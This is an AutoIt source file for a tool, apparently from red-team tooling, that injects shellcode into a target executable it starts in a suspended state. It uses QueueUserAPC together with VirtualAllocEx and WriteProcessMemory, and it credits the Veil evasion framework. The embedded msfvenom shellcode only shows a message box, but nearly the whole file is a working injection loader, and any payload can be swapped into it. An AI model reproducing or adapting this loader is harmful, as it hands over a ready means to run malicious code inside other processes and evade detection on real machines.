#NoTrayIcon
#Region
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion

#include <Process.au3>
#include <Memory.au3>
#include <WinAPI.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Injects shellcode into a target executable using the QueueUserAPC API.

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== QueueUserAPC Injection ===========" & @CRLF & @CRLF)

; Hex shellcode
; msfvenom -p windows/x64/messagebox EXITFUNC=thread TITLE="What is my purpose?" TEXT="You pass butter." -f hex
Global $hexShellcode = "fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1000000003e488d951a0100003e4c8d852b0100004831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5596f752070617373206275747465722e0057686174206973206d7920707572706f73653f00"

;~ Commandline arguments check
_CheckArguments()

;~ Start target process
_StartProcess()

#cs ----------------------------------------------------------------------------

Main functions:
    _CheckArguments()
    _StartProcess()
    _QueueUserAPCInject()

#ce ----------------------------------------------------------------------------

Func _CheckArguments()

    If $CmdLine[0] <= 0 Then
        ConsoleWrite("[X] You must provide a target process" & @CRLF & @CRLF)
        ConsoleWrite("[i] QueueUserAPC.exe full-path-to-executable" & @CRLF & @CRLF)
        Exit

    ElseIf $CmdLine[0] > 1 Then
        ConsoleWrite("[X] Too many arguments provided." & @CRLF & @CRLF)
        ConsoleWrite("[i] QueueUserAPC.exe full-path-to-executable" & @CRLF & @CRLF)
        Exit

    EndIf

EndFunc ;==>_CheckArguments

Func _StartProcess()

    ; Start process
    ConsoleWrite("----- Starting target process -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking executable path" & @CRLF & @CRLF)

    Global $targetProcPath = $CmdLine[1]
    Global $checkProcPath = FileExists($targetProcPath)

    If Not $checkProcPath = 0 Then

        Global $targetProcSize = FileGetSize($CmdLine[1])

        If $targetProcSize <= 0 Then
            ConsoleWrite("[X] Target file appears to be empty or is a directory. Exiting." & @CRLF & @CRLF)
            Exit
        EndIf

        If Not $targetProcSize <= 0 Then
            ConsoleWrite("[i] Target executable: " & $targetProcPath & @CRLF & @CRLF)
            ConsoleWrite("[i] Target executable size: " & $targetProcSize & " bytes" & @CRLF & @CRLF)

            ConsoleWrite("[*] Starting target process" & @CRLF & @CRLF)
            ; Begin APC injection
            _QueueUserAPCInject()
        EndIf

    ElseIf $checkProcPath = 0 Then
        ConsoleWrite("[X] '" & $CmdLine[1] & "' is not a valid executable path." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc ;==>_StartProcess

Func _QueueUserAPCInject()

    ; _QueueUserAPC injection
    ConsoleWrite("----- QueueUserAPC Injection -----" & @CRLF & @CRLF)

    ; Adapted from - https://github.com/Veil-Framework/Veil/blob/master/tools/evasion/payloads/autoit/shellcode_inject/flat.py
    ; Credits - ChrisTruncer (https://github.com/ChrisTruncer)
    Local $autoItshellcode = "0x" & $hexShellcode
    Local $shellcodeBuffer = DllStructCreate("byte[" & BinaryLen($autoItshellcode) & "]")
    DllStructSetData($shellcodeBuffer, 1, $autoItshellcode)

    Local $tProcessInfo = DllStructCreate($tagPROCESS_INFORMATION)
    Local $tStartupInfo = DllStructCreate($tagSTARTUPINFO)

    ; CreateProcess
    _WinAPI_CreateProcess( _
        '', _
        $targetProcPath, _
        0, _
        0, _
        0, _
        $CREATE_SUSPENDED, _
        0, _
        0, _
        $tStartupInfo, _
        $tProcessInfo)

    ; Suspended process details
    Local $targetPID = DllStructGetData($tProcessInfo, 'ProcessID')
    Local $targetProcName = _ProcessGetName($targetPID)
    ConsoleWrite("[i] Suspended process started with PID:" & $targetPID & " (" & $targetProcName & ")" & @CRLF & @CRLF)

    ; Shellcode info
    ConsoleWrite("[i] Shellcode size: " & sizeof($shellcodeBuffer) & " bytes" & @CRLF & @CRLF)
    ConsoleWrite("[*] Injecting shellcode into PID:" & $targetPID & " (" & $targetProcName & ")" & @CRLF & @CRLF)

    ; OpenProcess
    $hProcess = _WinAPI_OpenProcess( _
        $PROCESS_ALL_ACCESS, _
        0, _
        $targetPID, _
        True)

    ; VirtualAllocEx
    $hRegion = _MemVirtualAllocEx( _
        $hProcess, _
        0, _
        sizeof($shellcodeBuffer), _
        $MEM_COMMIT + $MEM_RESERVE, _
        $PAGE_EXECUTE_READWRITE)

    ; WriteProcessMemory
    Local $written

    _WinAPI_WriteProcessMemory ( _
        $hProcess, _
        $hRegion, _
        _ptr($shellcodeBuffer), _
        sizeof($shellcodeBuffer), _
        $written)

    ; OpenThread
    Local $threadID = DllStructGetData($tProcessInfo, 'ThreadID')

    $openThreadCall = DllCall("kernel32.dll", "ptr", "OpenThread", _
        "dword", 0x001F03FF, _ ;THREAD_ALL_ACCESS
        "int", 0, _
        "dword", $threadID)

    $hThread = $openThreadCall[0]

    ; QueueUserAPC
    $apcCall = DllCall("kernel32.dll", "int", "QueueUserAPC", _
        "ptr", $hRegion, _
        "hwnd", $hThread, _
        "int", 0)

    $apc = $apcCall[0]

    ; ResumeThread
    ConsoleWrite("[i] Shellcode injected." & @CRLF & @CRLF)
    ConsoleWrite("[*] Resuming target process." & @CRLF & @CRLF)

    $resumeThreadCall = DllCall("kernel32.dll", "ptr", "ResumeThread", _
        "ptr", $hThread)

    $res = $resumeThreadCall[0]

    ; CloseHandle
    $closeHandleCall = DllCall("kernel32.dll", "ptr", "CloseHandle", _
        "ptr", $hProcess)

    $close = $closeHandleCall[0]

EndFunc ;==>_QueueUserAPCInject

#cs ----------------------------------------------------------------------------

Util functions:
    _ptr
    sizeof

#ce ----------------------------------------------------------------------------

; Adapted from - https://www.autoitscript.com/forum/topic/95419-injecting-and-executing-code-in-external-process/
; Credits - monoceres (https://www.autoitscript.com/forum/profile/23930-monoceres/)
Func _ptr($s, $e = "")
	If $e <> "" Then Return DllStructGetPtr($s, $e)
	Return DllStructGetPtr($s)
EndFunc   ;==>_ptr

Func sizeof($s)
	Return DllStructGetSize($s)
EndFunc   ;==>sizeof
